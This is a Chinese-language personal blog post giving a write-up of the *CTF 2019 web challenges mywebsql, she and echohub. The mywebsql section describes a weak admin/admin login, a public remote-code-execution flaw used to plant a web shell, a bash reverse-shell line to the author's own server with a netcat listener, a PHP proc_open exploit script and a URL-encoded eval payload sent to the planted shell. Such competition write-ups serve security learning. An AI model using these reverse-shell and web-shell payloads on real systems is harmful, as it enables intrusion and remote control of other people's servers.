<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>startctf2019 · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">startctf2019</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-04-30</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="ctf"> ctf</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="starctf2019"><a href="#starctf2019" class="headerlink" title="starctf2019"></a>starctf2019</h1><h2 id="mywebsql"><a href="#mywebsql" class="headerlink" title="mywebsql"></a>mywebsql</h2><p><strong>admin admin</strong>弱口令登入，网上搜索，关于mywebsql的cve，找到了一个<a href="https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md" target="_blank" rel="noopener">rce</a>，按照他的步骤，生成一个shell，蚁剑连接，将同名目录下的<strong>readflag</strong>下载下来，实在没啥思路，之后参考了师傅的<a href="https://www.zhaoj.in/read-5479.html" target="_blank" rel="noopener">blog</a></p>
<p>运行<strong>readflag</strong>文件：/readflag,会出现：</p>
<blockquote>
<p>Solve the easy challenge first<br>(((((886366)-(-362092))+(188748))-(-638404))-(-286590))<br>input your answer: calculate error!</p>
</blockquote>
<p>然后闪退<br>在<strong>/backups</strong>目录下新建一个sh文件（本目录下权限最大），内容如下：</p>
<pre><code>bash -i &gt;&amp; /dev/tcp/Your IP/8888 0&gt;&amp;1
</code></pre><p>在自己的vps上监听：</p>
<pre><code>nc -lvvp 8888
</code></pre><p>成功反弹shell</p>
<p>用<strong>ida</strong>查看readflag文件，注意到<strong><a href="https://linux.die.net/man/3/ualarm" target="_blank" rel="noopener">ualarm</a></strong>函数，有如下描述：</p>
<blockquote>
<p>Description<br>The ualarm() function causes the signal SIGALRM to be sent to the invoking process after (not less than) usecs microseconds. The delay may be lengthened slightly by any system activity or by the time spent processing the call or by the granularity of system timers.</p>
<p>Unless caught or ignored, the SIGALRM signal will terminate the process.</p>
<p>If the interval argument is nonzero, further SIGALRM signals will be sent every interval microseconds after the first.</p>
</blockquote>
<p>注意这句话：<br><strong>Unless caught or ignored, the SIGALRM signal will terminate the process.</strong><br>所以我们试图去捕获sigalrm<br>找到一个参考：<a href="https://www.cnblogs.com/maxgongzuo/p/6372898.html" target="_blank" rel="noopener">https://www.cnblogs.com/maxgongzuo/p/6372898.html</a><br>利用：<code>trap &#39;&#39; 14</code></p>
<p>最后：</p>
<blockquote>
<p>Solve the easy challenge first<br>(((((-95329)-(-655048))+(-432249))+(476302))-(-374607))<br>input your answer: 978379<br>ok! here is your flag!!<br>*ctf{h4E9PKLkr6HTO3JcRglVdYaBSA0eDU8y}</p>
</blockquote>
<p>方法2：参考<a href="https://evoa.me/index.php/archives/51/" target="_blank" rel="noopener">writeup</a><br>新建一个exp.php:</p>
<pre><code>&lt;?php
$descriptorspec = array(
   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // 标准输入，子进程从此管道中读取数据
   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // 标准输出，子进程向此管道中写入数据
   2 =&gt; array(&quot;file&quot;, &quot;/tmp/error-output.txt&quot;, &quot;a&quot;) // 标准错误，写入到一个文件
);
$cwd = &#39;/tmp&#39;;
$env = array(&#39;some_option&#39; =&gt; &#39;aeiou&#39;);
$process = proc_open(&#39;/readflag&#39;, $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
    // $pipes 现在看起来是这样的：
    // 0 =&gt; 可以向子进程标准输入写入的句柄
    // 1 =&gt; 可以从子进程标准输出读取的句柄
    // 错误输出将被追加到文件 /tmp/error-output.txt
    //fwrite($pipes[0], &#39;&#39;);
    //fclose($pipes[0]);
        $output1 = fread($pipes[1],1024);
        var_dump($output);
        $output2 = fread($pipes[1],1024);
        var_dump($output);
        $output3 = fread($pipes[1],1024);
        var_dump($output);

    $calc = trim($output2);
    $an = eval(&quot;return $calc;&quot;);
    var_dump($an);
    fwrite($pipes[0], (string)$an.&quot;\n&quot;);
    $output = stream_get_contents($pipes[1]);
    var_dump($output);
    // 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。
    $return_value = proc_close($process);
    echo &quot;command returned $return_value\n&quot;;
}
?&gt;
</code></pre><p>执行可得：</p>
<blockquote>
<p>PHP Notice:  Undefined variable: output in /var/www/html/backups/exp.php on line 18<br>NULL<br>PHP Notice:  Undefined variable: output in /var/www/html/backups/exp.php on line 20<br>NULL<br>PHP Notice:  Undefined variable: output in /var/www/html/backups/exp.php on line 22<br>NULL<br>int(-1669937)<br>string(63) “ok! here is your flag!!<br>*ctf{h4E9PKLkr6HTO3JcRglVdYaBSA0eDU8y}<br>“<br>command returned 0</p>
</blockquote>
<p>方法3（同二有些类似）：</p>
<pre><code>http://targeturl/backups/123456.php?cmd=$d=array(0=%3Earray(%22pipe%22,%22r%22),1=%3Earray(%22pipe%22,%22w%22));$fp=proc_open(%22../../../../readflag%22,$d,$pipes);$a=fgets($pipes[1]);$x=fgets($pipes[1]);$ret=eval(%22return%20$x;%22);echo%20$ret.%22%3CBR%3E%22;$emm=fwrite($pipes[0],strval($ret));echo%20$emm.%22%3CBR%3E%22;fclose($pipes[0]);$c=fgets($pipes[1]);$e=fgets($pipes[1]);echo%20$c.%20$e.%22%3CBR%3E%22;fclose($pipes[1]);proc_close($fp);
</code></pre><p><a href="https://php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">proc_open函数</a></p>
<h2 id="she"><a href="#she" class="headerlink" title="she"></a>she</h2><p>一个游戏，下载<a href="http://www.rpgmakerweb.com/products/programs/rpg-maker-xp" target="_blank" rel="noopener">rpg maker xp</a><br>新建项目，然后将she下面的文件复制到项目中，然后再打开项目，就可以进行编辑</p>
<h2 id="echohub"><a href="#echohub" class="headerlink" title="echohub"></a>echohub</h2><p>查看源码，注意到</p>
<pre><code>
&lt;!--/?source=1--&gt;
&lt;pre&gt;
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | 
| |  _________   | || |     ______   | || |  ____  ____  | || |     ____     | || |  ____  ____  | || | _____  _____ | || |   ______     | | 
| | |_   ___  |  | || |   .&#39; ___  |  | || | |_   ||   _| | || |   .&#39;    `.   | || | |_   ||   _| | || ||_   _||_   _|| || |  |_   _ \    | | 
| |   | |_  \_|  | || |  / .&#39;   \_|  | || |   | |__| |   | || |  /  .--.  \  | || |   | |__| |   | || |  | |    | |  | || |    | |_) |   | | 
| |   |  _|  _   | || |  | |         | || |   |  __  |   | || |  | |    | |  | || |   |  __  |   | || |  | &#39;    &#39; |  | || |    |  __&#39;.   | | 
| |  _| |___/ |  | || |  \ `.___.&#39;\  | || |  _| |  | |_  | || |  \  `--&#39;  /  | || |  _| |  | |_  | || |   \ `--&#39; /   | || |   _| |__) |  | | 
| | |_________|  | || |   `._____.&#39;  | || | |____||____| | || |   `.____.&#39;   | || | |____||____| | || |    `.__.&#39;    | || |  |_______/   | | 
| |              | || |              | || |              | || |              | || |              | || |              | || |              | | 
| &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; | 
 &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  

 Welcome to random stack ! Try to execute `/readflag` :P

 &lt;/pre&gt;

 &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;root &gt; &lt;input name=&quot;data&quot; placeholder=&quot;input some data&quot;&gt;&lt;/form&gt;O0OO0stack
</code></pre><p>于是得到源码：</p>
<pre><code>&lt;?php
$banner = &lt;&lt;&lt;EOF
&lt;!--/?source=1--&gt;
&lt;pre&gt;
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | 
| |  _________   | || |     ______   | || |  ____  ____  | || |     ____     | || |  ____  ____  | || | _____  _____ | || |   ______     | | 
| | |_   ___  |  | || |   .&#39; ___  |  | || | |_   ||   _| | || |   .&#39;    `.   | || | |_   ||   _| | || ||_   _||_   _|| || |  |_   _ \    | | 
| |   | |_  \_|  | || |  / .&#39;   \_|  | || |   | |__| |   | || |  /  .--.  \  | || |   | |__| |   | || |  | |    | |  | || |    | |_) |   | | 
| |   |  _|  _   | || |  | |         | || |   |  __  |   | || |  | |    | |  | || |   |  __  |   | || |  | &#39;    &#39; |  | || |    |  __&#39;.   | | 
| |  _| |___/ |  | || |  \ `.___.&#39;\  | || |  _| |  | |_  | || |  \  `--&#39;  /  | || |  _| |  | |_  | || |   \ `--&#39; /   | || |   _| |__) |  | | 
| | |_________|  | || |   `._____.&#39;  | || | |____||____| | || |   `.____.&#39;   | || | |____||____| | || |    `.__.&#39;    | || |  |_______/   | | 
| |              | || |              | || |              | || |              | || |              | || |              | || |              | | 
| &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; || &#39;--------------&#39; | 
 &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  &#39;----------------&#39;  

 Welcome to random stack ! Try to execute `/readflag` :P

 &lt;/pre&gt;

 &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;root &gt; &lt;input name=&quot;data&quot; placeholder=&quot;input some data&quot;&gt;&lt;/form&gt;
EOF;
echo $banner;
if(isset($_GET[&#39;source&#39;])){
    $file = fopen(&quot;index.php&quot;,&quot;r&quot;);
    $contents = fread($file,filesize(&quot;index.php&quot;));
    echo &quot;---------------sourcecode---------------&quot;;
    echo base64_encode($contents);
    echo &quot;----------------------------------------&quot;;
    fclose($file);
    //Dockerfile here
    echo &quot;RlJPTSB1YnVudHU6MTguMDQKClJVTiBzZWQgLWkgInMvaHR0cDpcL1wvYXJjaGl2ZS51YnVudHUuY29tL2h0dHA6XC9cL21pcnJvcnMudXN0Yy5lZHUuY24vZyIgL2V0Yy9hcHQvc291cmNlcy5saXN0ClJVTiBhcHQtZ2V0IHVwZGF0ZQpSVU4gYXB0LWdldCAteSBpbnN0YWxsIHNvZnR3YXJlLXByb3BlcnRpZXMtY29tbW9uClJVTiBhZGQtYXB0LXJlcG9zaXRvcnkgLXkgcHBhOm9uZHJlai9waHAKUlVOIGFwdC1nZXQgdXBkYXRlClJVTiBhcHQtZ2V0IC15IHVwZ3JhZGUKUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCB0emRhdGEKUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCB2aW0KUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCBhcGFjaGUyClJVTiBhcHQtY2FjaGUgc2VhcmNoICJwaHAiIHwgZ3JlcCAicGhwNy4zInwgYXdrICd7cHJpbnQgJDF9J3wgeGFyZ3MgYXB0LWdldCAteSBpbnN0YWxsClJVTiBzZXJ2aWNlIC0tc3RhdHVzLWFsbCB8IGF3ayAne3ByaW50ICQ0fSd8IHhhcmdzIC1pIHNlcnZpY2Uge30gc3RvcAoKUlVOIHJtIC92YXIvd3d3L2h0bWwvaW5kZXguaHRtbApDT1BZIHJhbmRvbXN0YWNrLnBocCAvdmFyL3d3dy9odG1sL2luZGV4LnBocApDT1BZIHNhbmRib3gucGhwIC92YXIvd3d3L2h0bWwvc2FuZGJveC5waHAKUlVOIGNobW9kIDc1NSAtUiAvdmFyL3d3dy9odG1sLwpDT1BZIGZsYWcgL2ZsYWcKQ09QWSByZWFkZmxhZyAvcmVhZGZsYWcKUlVOIGNobW9kIDU1NSAvcmVhZGZsYWcKUlVOIGNobW9kIHUrcyAvcmVhZGZsYWcKUlVOIGNobW9kIDUwMCAvZmxhZwpDT1BZIC4vcnVuLnNoIC9ydW4uc2gKQ09QWSAuL3BocC5pbmkgL2V0Yy9waHAvNy4zL2FwYWNoZTIvcGhwLmluaQpSVU4gY2htb2QgNzAwIC9ydW4uc2gKCkNNRCBbIi9ydW4uc2giXQ==&quot;; 
    highlight_file(__FILE__);

}
$disable_functions = ini_get(&quot;disable_functions&quot;);
$loadext = get_loaded_extensions();
foreach ($loadext as $ext) {
    if(in_array($ext,array(&quot;Core&quot;,&quot;date&quot;,&quot;libxml&quot;,&quot;pcre&quot;,&quot;zlib&quot;,&quot;filter&quot;,&quot;hash&quot;,&quot;sqlite3&quot;,&quot;zip&quot;))) continue;
    else {
        if(count(get_extension_funcs($ext)?get_extension_funcs($ext):array()) &gt;= 1)
            $dfunc = join(&#39;,&#39;,get_extension_funcs($ext));
        else
            continue;
        $disable_functions = $disable_functions.$dfunc.&quot;,&quot;;

    }
}
$func = get_defined_functions()[&quot;internal&quot;];
foreach ($func as $f){
    if(stripos($f,&quot;file&quot;) !== false || stripos($f,&quot;open&quot;) !== false || stripos($f,&quot;read&quot;) !== false || stripos($f,&quot;write&quot;) !== false){
        $disable_functions = $disable_functions.$f.&quot;,&quot;;
    }
}

ini_set(&quot;disable_functions&quot;, $disable_functions);
ini_set(&quot;open_basedir&quot;,&quot;/var/www/html/:/tmp/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;/&quot;);
</code></pre></article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/04/30/CTF/starctf2019/">http://microvorld.com/2019/04/30/CTF/starctf2019/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/05/01/靶机/leopold/" title="leopold 靶机渗透"><span>< PreviousPost</span><br><span class="prevTitle">leopold 靶机渗透</span></a><a class="nextSlogan" href="/2019/04/29/python/python常见问题/" title="python常见问题"><span>NextPost ></span><br><span class="nextTitle">python常见问题</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#starctf2019"><span class="toc-number">1.</span> <span class="toc-text">starctf2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mywebsql"><span class="toc-number">1.1.</span> <span class="toc-text">mywebsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#she"><span class="toc-number">1.2.</span> <span class="toc-text">she</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echohub"><span class="toc-number">1.3.</span> <span class="toc-text">echohub</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>